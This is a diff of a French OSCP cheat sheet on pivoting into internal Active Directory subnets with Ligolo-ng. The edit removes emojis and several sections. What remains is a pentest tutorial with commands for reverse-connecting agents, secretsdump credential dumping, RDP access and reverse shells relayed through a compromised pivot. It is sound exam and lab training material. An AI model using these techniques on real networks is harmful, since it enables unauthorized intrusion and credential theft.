@@ -1,36 +1,6 @@
-# 🐛 Ligolo-ng — Fiche OSCP (pivot AD)
+# Ligolo-ng — Fiche OSCP (pivot AD)
 
-> **Objectif** : depuis ton Kali, atteindre des sous-réseaux internes que tu ne peux pas router directement, en passant par une machine compromise (le "pivot"). Aucun `proxychains`, tu utilises tes outils Kali (nmap, crackmapexec, evil-winrm, impacket, rdp...) comme si tu étais dans le réseau.
-
----
-
-## 🧠 Concept en 30 secondes
-
-```
-[Kali attaquant]  <---TLS--->  [Machine compromise (agent)]  --->  [Réseau interne]
-   (proxy)                          (agent Ligolo)                (ex: 172.16.1.0/24)
-```
-
-- **Proxy** = tourne sur ton Kali (c’est *toi* qui écoutes).
-- **Agent** = binaire déposé sur la machine compromise, il se **connecte à ton Kali** (reverse).
-- Le proxy expose une **interface TUN** locale. Tu ajoutes une route vers le sous-réseau cible → n'importe quel outil Kali passe par le tunnel.
-
-⚠️ Contre-intuitif au début : c'est l'agent qui se connecte à toi, pas l'inverse. Donc **ton port doit être joignable** depuis la cible.
-
----
-
-## 📦 Préparation (une fois pour toutes sur ton Kali)
-
-Télécharge les 2 binaires depuis https://github.com/nicocha30/ligolo-ng/releases :
-- `ligolo-ng_proxy_X.Y.Z_linux_amd64.tar.gz` → **pour toi (Kali)**
-- `ligolo-ng_agent_X.Y.Z_windows_amd64.zip` → **pour la cible Windows**
-- `ligolo-ng_agent_X.Y.Z_linux_amd64.tar.gz` → **pour la cible Linux**
-
-Range-les dans `~/tools/ligolo/` pour les avoir sous la main le jour J.
-
----
-
-## 🚀 Setup côté Kali (proxy)
+## Setup côté Kali (proxy)
 
 ### 1. Créer l'interface TUN (à faire à chaque redémarrage)
 
@@ -54,7 +24,7 @@ Tu tombes dans le shell interactif `ligolo-ng »`.
 
 ---
 
-## 🎯 Setup côté cible (agent)
+## Setup côté cible (agent)
 
 ### Transfert du binaire
 
@@ -93,14 +63,14 @@ INFO[0042] Agent joined.  name=DESKTOP-XXX@10.10.10.5 remote="..."
 
 ---
 
-## 🎛️ Commandes proxy essentielles
+## Commandes proxy essentielles
 
 Dans le shell `ligolo-ng »` :
 
 | Commande | Effet |
 |---|---|
 | `session` | Liste les agents connectés, en sélectionne un |
-| `ifconfig` | Affiche les interfaces réseau de l'agent (⭐ **repère les sous-réseaux à router**) |
+| `ifconfig` | Affiche les interfaces réseau de l'agent (**repère les sous-réseaux à router**) |
 | `autoroute` | Détecte les sous-réseaux et configure routes + interface tout seul (**le plus simple**) |
 | `start` / `tunnel_start` | Démarre le tunnel pour la session courante |
 | `stop` | Stoppe le tunnel |
@@ -109,7 +79,7 @@ Dans le shell `ligolo-ng »` :
 
 ---
 
-## 🛣️ Ajouter les routes (méthode manuelle)
+## Ajouter les routes (méthode manuelle)
 
 Une fois la session sélectionnée et le tunnel démarré, **dans un autre terminal Kali** :
 
@@ -133,11 +103,11 @@ impacket-secretsdump user:'pass'@172.16.1.10
 xfreerdp /v:172.16.1.10 /u:user /p:'pass'
 ```
 
-> 🔑 **Piège nmap classique** : à travers Ligolo, utilise `-sT` (TCP connect scan), pas `-sS`. Le TUN userland ne supporte pas les scans SYN bruts.
+> **Piège nmap classique** : à travers Ligolo, utilise `-sT` (TCP connect scan), pas `-sS`. Le TUN userland ne supporte pas les scans SYN bruts.
 
 ---
 
-## 🪆 Double pivot (typique AD OSCP)
+## Double pivot (typique AD OSCP)
 
 Scénario :
 ```
@@ -161,7 +131,7 @@ Traduction : "le pivot1 écoute sur son propre `0.0.0.0:11601` et forwarde vers 
 ./agent -connect IP_PIVOT1:11601 -ignore-cert
 ```
 
-Une nouvelle session apparaît dans ton proxy. 🎉
+Une nouvelle session apparaît dans ton proxy.
 
 ### 3. Deuxième interface TUN + routes
 
@@ -184,11 +154,11 @@ sudo ip route add 10.10.30.0/24 dev ligolo2
 
 Et voilà, tu attaques le DC comme si de rien n'était.
 
-> 💡 `autoroute` gère aussi ce cas et te propose de créer une nouvelle interface — teste-le en labo pour voir si tu préfères.
+> `autoroute` gère aussi ce cas et te propose de créer une nouvelle interface — teste-le en labo pour voir si tu préfères.
 
 ---
 
-## 🐚 Reverse shells à travers Ligolo
+## Reverse shells à travers Ligolo
 
 Ton listener Kali (`nc -lvnp 4444`) n'est **pas joignable** depuis le réseau interne. Tu dois faire écouter le pivot et forwarder vers toi.
 
@@ -208,7 +178,7 @@ Idem pour un relais SMB, un HTTP callback pour PetitPotam, etc.
 
 ---
 
-## 🧯 Troubleshooting rapide
+## Troubleshooting rapide
 
 | Symptôme | Cause probable |
 |---|---|
@@ -221,23 +191,3 @@ Idem pour un relais SMB, un HTTP callback pour PetitPotam, etc.
 | Le double pivot ne marche pas | Vérifie que le `listener_add` est bien sur pivot1 et que pivot2 pointe vers l'IP **interne** de pivot1 |
 
 ---
-
-## ✅ Checklist express jour J
-
-- [ ] Binaires `proxy` + `agent` (Windows & Linux) prêts dans un dossier
-- [ ] `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`
-- [ ] `./proxy -selfcert` lancé
-- [ ] Agent déployé et connecté → `session` → `ifconfig` → repérer les subnets
-- [ ] `start` puis `sudo ip route add SUBNET dev ligolo`
-- [ ] Test : `ping` une IP interne connue
-- [ ] Documenter dans le report : screenshots de `ifconfig` de l'agent + `ip route` + preuve de connectivité
-
----
-
-## 📚 Sources utiles
-
-- Repo officiel : https://github.com/nicocha30/ligolo-ng
-- Wiki : https://ligolo-ng.readthedocs.io
-- Notes OSCP communautaires : https://github.com/dollarboysushil/oscp-cpts-notes
-
-Bonne chance pour l'exam 🍀 — Try Harder!
